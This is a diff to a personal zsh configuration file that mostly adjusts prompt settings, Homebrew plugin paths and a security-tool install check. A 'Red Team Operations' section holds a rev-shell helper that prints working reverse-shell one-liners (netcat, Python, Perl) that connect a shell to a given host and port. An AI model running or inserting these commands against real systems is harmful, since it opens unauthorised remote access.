@@ -58,11 +58,6 @@ alias history="history 0"
 # make less more friendly for non-text input files, see lesspipe(1)
 #[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"
 
-# set variable identifying the chroot you work in (used in the prompt below)
-if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
-    debian_chroot=$(cat /etc/debian_chroot)
-fi
-
 # set a fancy prompt (non-color, unless we know we "want" color)
 case "$TERM" in
     xterm-color|*-256color) color_prompt=yes;;
@@ -90,60 +85,62 @@ if [ "$color_prompt" = yes ]; then
 
 
     # enable syntax-highlighting
-    if [ -f /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ] && [ "$color_prompt" = yes ]; then
+    if [ -f /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; then
         . /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
-        ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern)
-        ZSH_HIGHLIGHT_STYLES[default]=none
-        ZSH_HIGHLIGHT_STYLES[unknown-token]=fg=red,bold
-        ZSH_HIGHLIGHT_STYLES[reserved-word]=fg=cyan,bold
-        ZSH_HIGHLIGHT_STYLES[suffix-alias]=fg=green,underline
-        ZSH_HIGHLIGHT_STYLES[global-alias]=fg=magenta
-        ZSH_HIGHLIGHT_STYLES[precommand]=fg=green,underline
-        ZSH_HIGHLIGHT_STYLES[commandseparator]=fg=blue,bold
-        ZSH_HIGHLIGHT_STYLES[autodirectory]=fg=green,underline
-        ZSH_HIGHLIGHT_STYLES[path]=underline
-        ZSH_HIGHLIGHT_STYLES[path_pathseparator]=
-        ZSH_HIGHLIGHT_STYLES[path_prefix_pathseparator]=
-        ZSH_HIGHLIGHT_STYLES[globbing]=fg=blue,bold
-        ZSH_HIGHLIGHT_STYLES[history-expansion]=fg=blue,bold
-        ZSH_HIGHLIGHT_STYLES[command-substitution]=none
-        ZSH_HIGHLIGHT_STYLES[command-substitution-delimiter]=fg=magenta
-        ZSH_HIGHLIGHT_STYLES[process-substitution]=none
-        ZSH_HIGHLIGHT_STYLES[process-substitution-delimiter]=fg=magenta
-        ZSH_HIGHLIGHT_STYLES[single-hyphen-option]=fg=magenta
-        ZSH_HIGHLIGHT_STYLES[double-hyphen-option]=fg=magenta
-        ZSH_HIGHLIGHT_STYLES[back-quoted-argument]=none
-        ZSH_HIGHLIGHT_STYLES[back-quoted-argument-delimiter]=fg=blue,bold
-        ZSH_HIGHLIGHT_STYLES[single-quoted-argument]=fg=yellow
-        ZSH_HIGHLIGHT_STYLES[double-quoted-argument]=fg=yellow
-        ZSH_HIGHLIGHT_STYLES[dollar-quoted-argument]=fg=yellow
-        ZSH_HIGHLIGHT_STYLES[rc-quote]=fg=magenta
-        ZSH_HIGHLIGHT_STYLES[dollar-double-quoted-argument]=fg=magenta
-        ZSH_HIGHLIGHT_STYLES[back-double-quoted-argument]=fg=magenta
-        ZSH_HIGHLIGHT_STYLES[back-dollar-quoted-argument]=fg=magenta
-        ZSH_HIGHLIGHT_STYLES[assign]=none
-        ZSH_HIGHLIGHT_STYLES[redirection]=fg=blue,bold
-        ZSH_HIGHLIGHT_STYLES[comment]=fg=black,bold
-        ZSH_HIGHLIGHT_STYLES[named-fd]=none
-        ZSH_HIGHLIGHT_STYLES[numeric-fd]=none
-        ZSH_HIGHLIGHT_STYLES[arg0]=fg=green
-        ZSH_HIGHLIGHT_STYLES[bracket-error]=fg=red,bold
-        ZSH_HIGHLIGHT_STYLES[bracket-level-1]=fg=blue,bold
-        ZSH_HIGHLIGHT_STYLES[bracket-level-2]=fg=green,bold
-        ZSH_HIGHLIGHT_STYLES[bracket-level-3]=fg=magenta,bold
-        ZSH_HIGHLIGHT_STYLES[bracket-level-4]=fg=yellow,bold
-        ZSH_HIGHLIGHT_STYLES[bracket-level-5]=fg=cyan,bold
-        ZSH_HIGHLIGHT_STYLES[cursor-matchingbracket]=standout
+    elif [ -f /opt/homebrew/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; then
+        . /opt/homebrew/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
     fi
+    ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern)
+    ZSH_HIGHLIGHT_STYLES[default]=none
+    ZSH_HIGHLIGHT_STYLES[unknown-token]=fg=red,bold
+    ZSH_HIGHLIGHT_STYLES[reserved-word]=fg=cyan,bold
+    ZSH_HIGHLIGHT_STYLES[suffix-alias]=fg=green,underline
+    ZSH_HIGHLIGHT_STYLES[global-alias]=fg=magenta
+    ZSH_HIGHLIGHT_STYLES[precommand]=fg=green,underline
+    ZSH_HIGHLIGHT_STYLES[commandseparator]=fg=blue,bold
+    ZSH_HIGHLIGHT_STYLES[autodirectory]=fg=green,underline
+    ZSH_HIGHLIGHT_STYLES[path]=underline
+    ZSH_HIGHLIGHT_STYLES[path_pathseparator]=
+    ZSH_HIGHLIGHT_STYLES[path_prefix_pathseparator]=
+    ZSH_HIGHLIGHT_STYLES[globbing]=fg=blue,bold
+    ZSH_HIGHLIGHT_STYLES[history-expansion]=fg=blue,bold
+    ZSH_HIGHLIGHT_STYLES[command-substitution]=none
+    ZSH_HIGHLIGHT_STYLES[command-substitution-delimiter]=fg=magenta
+    ZSH_HIGHLIGHT_STYLES[process-substitution]=none
+    ZSH_HIGHLIGHT_STYLES[process-substitution-delimiter]=fg=magenta
+    ZSH_HIGHLIGHT_STYLES[single-hyphen-option]=fg=magenta
+    ZSH_HIGHLIGHT_STYLES[double-hyphen-option]=fg=magenta
+    ZSH_HIGHLIGHT_STYLES[back-quoted-argument]=none
+    ZSH_HIGHLIGHT_STYLES[back-quoted-argument-delimiter]=fg=blue,bold
+    ZSH_HIGHLIGHT_STYLES[single-quoted-argument]=fg=yellow
+    ZSH_HIGHLIGHT_STYLES[double-quoted-argument]=fg=yellow
+    ZSH_HIGHLIGHT_STYLES[dollar-quoted-argument]=fg=yellow
+    ZSH_HIGHLIGHT_STYLES[rc-quote]=fg=magenta
+    ZSH_HIGHLIGHT_STYLES[dollar-double-quoted-argument]=fg=magenta
+    ZSH_HIGHLIGHT_STYLES[back-double-quoted-argument]=fg=magenta
+    ZSH_HIGHLIGHT_STYLES[back-dollar-quoted-argument]=fg=magenta
+    ZSH_HIGHLIGHT_STYLES[assign]=none
+    ZSH_HIGHLIGHT_STYLES[redirection]=fg=blue,bold
+    ZSH_HIGHLIGHT_STYLES[comment]=fg=black,bold
+    ZSH_HIGHLIGHT_STYLES[named-fd]=none
+    ZSH_HIGHLIGHT_STYLES[numeric-fd]=none
+    ZSH_HIGHLIGHT_STYLES[arg0]=fg=green
+    ZSH_HIGHLIGHT_STYLES[bracket-error]=fg=red,bold
+    ZSH_HIGHLIGHT_STYLES[bracket-level-1]=fg=blue,bold
+    ZSH_HIGHLIGHT_STYLES[bracket-level-2]=fg=green,bold
+    ZSH_HIGHLIGHT_STYLES[bracket-level-3]=fg=magenta,bold
+    ZSH_HIGHLIGHT_STYLES[bracket-level-4]=fg=yellow,bold
+    ZSH_HIGHLIGHT_STYLES[bracket-level-5]=fg=cyan,bold
+    ZSH_HIGHLIGHT_STYLES[cursor-matchingbracket]=standout
 else
-    PROMPT='${debian_chroot:+($debian_chroot)}%n@%m:%~%# '
+    PROMPT='%n@%m:%~%# '
 fi
 unset color_prompt force_color_prompt
 
 # If this is an xterm set the title to user@host:dir
 case "$TERM" in
 xterm*|rxvt*)
-    TERM_TITLE=$'\e]0;${debian_chroot:+($debian_chroot)}%n@%m: %~\a'
+    TERM_TITLE=$'\e]0;%n@%m: %~\a'
     ;;
 *)
     ;;
@@ -180,9 +177,11 @@ alias l='ls -CF'
 # enable auto-suggestions based on the history
 if [ -f /usr/local/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
     . /usr/local/share/zsh-autosuggestions/zsh-autosuggestions.zsh
-    # change suggestion color
-    ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=#999'
+elif [ -f /opt/homebrew/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
+    . /opt/homebrew/share/zsh-autosuggestions/zsh-autosuggestions.zsh
 fi
+# change suggestion color
+ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=#999'
 
 # ----------------------
 # Red Team Operations
@@ -212,7 +211,7 @@ rev-shell() {
             echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $2 $3 >/tmp/f"
             ;;
         python)
-            echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$2",$3));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
+            echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((("$2",$3)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
             ;;
         perl)
             echo "perl -e 'use Socket;$i=\"$2\";$p=$3;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">\\&S\");open(STDOUT,\">\\&S\");open(STDERR,\">\\&S\");exec(\"/bin/sh -i\");};'"
@@ -229,9 +228,6 @@ get_tun0_ip() {
     ip addr show tun0 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1
 }
 
-
-
-
 # -- Tool Check --
 # Check for Homebrew and install if not found
 install_homebrew() {
@@ -247,14 +243,8 @@ install_homebrew() {
 check_tools() {
     install_homebrew
     brew_tools=("nmap" "socat" "gobuster" "feroxbuster" "figlet" "lolcat")
-    pip_tools=()
-    gem_tools=()
     installed_brew_tools=()
-    installed_pip_tools=()
-    installed_gem_tools=()
     missing_brew_tools=()
-    missing_pip_tools=()
-    missing_gem_tools=()
 
     for tool in "${brew_tools[@]}"; do
         if command -v $tool &> /dev/null; then
@@ -264,59 +254,18 @@ check_tools() {
         fi
     done
 
-    for tool in "${pip_tools[@]}"; do
-        if python3 -m pip show $tool &> /dev/null; then
-            installed_pip_tools+=($tool)
-        else
-            missing_pip_tools+=($tool)
-        fi
-    done
-
-    for tool in "${gem_tools[@]}"; do
-        if gem list -i $tool &> /dev/null; then
-            installed_gem_tools+=($tool)
-        else
-            missing_gem_tools+=($tool)
-        fi
-    done
-
-    if [ ${#installed_brew_tools[@]} -gt 0 ] || [ ${#installed_pip_tools[@]} -gt 0 ] || [ ${#installed_gem_tools[@]} -gt 0 ]; then
+    if [ ${#installed_brew_tools[@]} -gt 0 ]; then
         echo "The following tools are already installed:"
-        if [ ${#installed_brew_tools[@]} -gt 0 ]; then
-            echo "  Homebrew: ${installed_brew_tools[@]}"
-        fi
-        if [ ${#installed_pip_tools[@]} -gt 0 ]; then
-            echo "  Pip: ${installed_pip_tools[@]}"
-        fi
-        if [ ${#gem_tools[@]} -gt 0 ]; then
-            echo "  Gem: ${installed_gem_tools[@]}"
-        fi
+        echo "  Homebrew: ${installed_brew_tools[@]}"
     fi
 
-    if [ ${#missing_brew_tools[@]} -gt 0 ] || [ ${#missing_pip_tools[@]} -gt 0 ] || [ ${#missing_gem_tools[@]} -gt 0 ]; then
+    if [ ${#missing_brew_tools[@]} -gt 0 ]; then
         echo "The following tools are not installed:"
-        if [ ${#missing_brew_tools[@]} -gt 0 ]; then
-            echo "  Homebrew: ${missing_brew_tools[@]}"
-        fi
-        if [ ${#missing_pip_tools[@]} -gt 0 ]; then
-            echo "  Pip: ${missing_pip_tools[@]}"
-        fi
-        if [ ${#missing_gem_tools[@]} -gt 0 ]; then
-            echo "  Gem: ${missing_gem_tools[@]}"
-        fi
+        echo "  Homebrew: ${missing_brew_tools[@]}"
 
         read "response?Install them now? [y/N] "
         if [[ "$response" =~ ^([yY][eE][sS]|[yY])$ ]]; then
-            if [ ${#missing_brew_tools[@]} -gt 0 ]; then
-                # Note: metasploit is deprecated and will be removed from Homebrew in the future
-                brew install ${missing_brew_tools[@]}
-            fi
-            if [ ${#missing_pip_tools[@]} -gt 0 ]; then
-                python3 -m pip install ${missing_pip_tools[@]}
-            fi
-            if [ ${#missing_gem_tools[@]} -gt 0 ]; then
-                gem install ${missing_gem_tools[@]}
-            fi
+            brew install ${missing_brew_tools[@]}
         fi
     fi
 }
@@ -364,7 +313,3 @@ echo "Type /help for a list of commands."
     n: Switch to next tmux window.
     "
 }
-
-
-
-
